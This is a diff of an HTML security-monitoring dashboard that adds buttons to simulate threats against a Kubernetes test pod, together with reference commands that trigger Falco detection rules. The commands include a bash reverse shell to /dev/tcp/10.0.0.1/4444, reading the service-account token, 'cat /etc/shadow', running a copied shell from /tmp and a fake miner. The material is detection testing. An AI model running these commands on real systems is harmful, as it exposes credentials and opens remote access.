@@ -130,7 +130,19 @@
 
   <!-- Alert table -->
   <div class="panel">
-    <div class="panel-title">Live Alert Table (last 50, newest first)</div>
+    <div class="panel-title-row">
+      <div class="panel-title">Live Alert Table (last 50, newest first)</div>
+      <button
+        class="reset-btn"
+        id="reset-btn"
+        type="button"
+        title="Clear controller alert history and reset decision engine state"
+        aria-label="Reset test results"
+      >
+        <span class="reset-btn-icon" aria-hidden="true">↺</span>
+        Reset Test Results
+      </button>
+    </div>
     <div class="alert-table-wrap">
       <table class="alert-table">
         <thead>
@@ -168,56 +180,211 @@
       </div>
     </div>
 
-    <!-- Attack / test panel -->
-    <div class="panel">
-      <div class="panel-title">How to generate a test event (human-run)</div>
-      <div class="attack-panel">
-        <div class="attack-note">
-          ⚠️ Run these in your terminal — the dashboard only <em>observes</em>.
-          The victim pod must be running with <code>rtm.enforce=true</code>.
-        </div>
+    <!-- Threat Injection Panel -->
+    <div class="panel threat-panel">
+      <div class="panel-header-row">
+        <div class="panel-title">INJECT THREAT</div>
+        <span class="threat-target-badge">Target: shop/victim (rtm.enforce=true)</span>
+      </div>
+      <p class="threat-desc">
+        Trigger controlled threat simulations on the designated test workload. Detection is verified independently via the Falco &rarr; Falcosidekick &rarr; Controller pipeline.
+      </p>
 
-        <div>
-          <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E1 — Shell spawn (RTM-001)</div>
-          <div class="attack-cmd">
-            <code>kubectl exec -n shop deploy/victim -- sh -c "echo test"</code>
-            <button class="copy-btn">Copy</button>
-          </div>
-        </div>
+      <!-- 2-column grid of threat buttons -->
+      <div class="threat-grid">
 
-        <div>
-          <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E2 — SA token read (RTM-003)</div>
-          <div class="attack-cmd">
-            <code>kubectl exec -n shop deploy/victim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>
-            <button class="copy-btn">Copy</button>
+        <button class="threat-btn" id="btn-e1" data-scenario="E1" type="button" title="Trigger E1 Shell Spawn">
+          <div class="threat-btn-top">
+            <span class="threat-id">E1</span>
+            <span class="threat-rule-tag">RTM-001</span>
           </div>
-        </div>
+          <div class="threat-name">Shell</div>
+          <div class="threat-subtitle">kubectl exec sh</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
 
-        <div>
-          <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E3 — Binary from /tmp (RTM-005)</div>
-          <div class="attack-cmd">
-            <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sh /tmp/evil && /tmp/evil -c id"</code>
-            <button class="copy-btn">Copy</button>
+        <button class="threat-btn" id="btn-e2" data-scenario="E2" type="button" title="Trigger E2 Token Read">
+          <div class="threat-btn-top">
+            <span class="threat-id">E2</span>
+            <span class="threat-rule-tag">RTM-001 + RTM-003</span>
           </div>
-        </div>
+          <div class="threat-name">Token Read</div>
+          <div class="threat-subtitle">fires RTM-001 + RTM-003</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
 
-        <div>
-          <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E4 — Reverse shell (RTM-007)</div>
-          <div class="attack-cmd">
-            <code>kubectl exec -n shop deploy/victim -- sh -c "timeout 5 bash -i &gt;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1" || true</code>
-            <button class="copy-btn">Copy</button>
+        <button class="threat-btn" id="btn-e3" data-scenario="E3" type="button" title="Trigger E3 Binary in /tmp">
+          <div class="threat-btn-top">
+            <span class="threat-id">E3</span>
+            <span class="threat-rule-tag">RTM-005</span>
           </div>
-        </div>
+          <div class="threat-name">Binary in /tmp</div>
+          <div class="threat-subtitle">RTM-005</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
 
-        <div>
-          <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">Port-forward to view this dashboard</div>
-          <div class="attack-cmd">
-            <code>kubectl port-forward svc/rtm-controller -n rtm-system 8000:8000</code>
-            <button class="copy-btn">Copy</button>
+        <button class="threat-btn" id="btn-e4" data-scenario="E4" type="button" title="Trigger E4 Reverse Shell Simulation">
+          <div class="threat-btn-top">
+            <span class="threat-id">E4</span>
+            <span class="threat-rule-tag">RTM-007</span>
           </div>
-        </div>
+          <div class="threat-name">Reverse Shell</div>
+          <div class="threat-subtitle">RTM-007</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e5" data-scenario="E5" type="button" title="Trigger E5 Sensitive File Read">
+          <div class="threat-btn-top">
+            <span class="threat-id">E5</span>
+            <span class="threat-rule-tag">RTM-002</span>
+          </div>
+          <div class="threat-name">Sensitive File</div>
+          <div class="threat-subtitle">cat /etc/shadow</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e6" data-scenario="E6" type="button" title="Trigger E6 Package Tool Execution">
+          <div class="threat-btn-top">
+            <span class="threat-id">E6</span>
+            <span class="threat-rule-tag">RTM-004</span>
+          </div>
+          <div class="threat-name">Package Tool</div>
+          <div class="threat-subtitle">pip / apt exec</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e7" data-scenario="E7" type="button" title="Trigger E7 Public Egress Connection">
+          <div class="threat-btn-top">
+            <span class="threat-id">E7</span>
+            <span class="threat-rule-tag">RTM-006</span>
+          </div>
+          <div class="threat-name">Public Egress</div>
+          <div class="threat-subtitle">connect public IP</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
+
+        <button class="threat-btn" id="btn-e8" data-scenario="E8" type="button" title="Trigger E8 Crypto Miner Simulation">
+          <div class="threat-btn-top">
+            <span class="threat-id">E8</span>
+            <span class="threat-rule-tag">RTM-008</span>
+          </div>
+          <div class="threat-name">Crypto Miner</div>
+          <div class="threat-subtitle">xmrig / miner port</div>
+          <div class="threat-spinner" aria-hidden="true"></div>
+        </button>
 
       </div>
+
+      <!-- Simulation & Correlation Feedback Card -->
+      <div class="simulation-feedback" id="simulation-feedback">
+        <div class="feedback-header">
+          <span class="feedback-status-dot idle" id="feedback-dot"></span>
+          <span class="feedback-title" id="feedback-title">Simulation Pipeline: Ready</span>
+          <span class="feedback-sim-id" id="feedback-sim-id"></span>
+        </div>
+        <div class="feedback-body" id="feedback-body">
+          Select a threat scenario above to launch a controlled simulation against the test victim pod.
+        </div>
+        <div class="feedback-pipeline-steps" id="feedback-steps" style="display:none;">
+          <div class="fb-step" id="fb-step-exec">
+            <span class="fb-step-icon">1</span>
+            <span class="fb-step-text">Simulate</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-detect">
+            <span class="fb-step-icon">2</span>
+            <span class="fb-step-text">Falco Detect</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-decision">
+            <span class="fb-step-icon">3</span>
+            <span class="fb-step-text">RTM Decision</span>
+          </div>
+          <div class="fb-arrow">&rarr;</div>
+          <div class="fb-step" id="fb-step-gate">
+            <span class="fb-step-icon">4</span>
+            <span class="fb-step-text">Safety Gate</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Collapsible manual terminal reference commands -->
+      <details class="manual-terminal-details">
+        <summary>Manual terminal commands (reference)</summary>
+        <div class="attack-panel" style="margin-top:12px;">
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E1 ? Shell spawn (RTM-001)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "echo test"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E2 ? SA token read (RTM-003)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E3 ? Binary from /tmp (RTM-005)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sh /tmp/evil && /tmp/evil -c id"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E4 ? Reverse shell (RTM-007)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- bash -c "timeout 2 bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1 || true"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E5 — Sensitive file read (RTM-002)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- cat /etc/shadow</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E6 — Package manager / download tool (RTM-004)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- pip --version</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E7 — Public egress connection (RTM-006)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- curl -m 2 -s -o /dev/null https://1.1.1.1</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">E8 — Crypto-miner indicator (RTM-008)</div>
+            <div class="attack-cmd">
+              <code>kubectl exec -n shop deploy/victim -- sh -c "cp /bin/sleep /tmp/xmrig && /tmp/xmrig 0.1 && rm -f /tmp/xmrig"</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+
+          <div>
+            <div style="font-size:10px;color:var(--text-muted);margin-bottom:6px;font-weight:600;letter-spacing:0.5px">Port-forward to view this dashboard</div>
+            <div class="attack-cmd">
+              <code>kubectl port-forward svc/rtm-controller -n rtm-system 8000:8000</code>
+              <button class="copy-btn">Copy</button>
+            </div>
+          </div>
+        </div>
+      </details>
     </div>
 
   </div><!-- /two-col -->
@@ -225,5 +392,6 @@
 </main>
 
 <script src="app.js"></script>
+<div id="toast-container"></div>
 </body>
 </html>
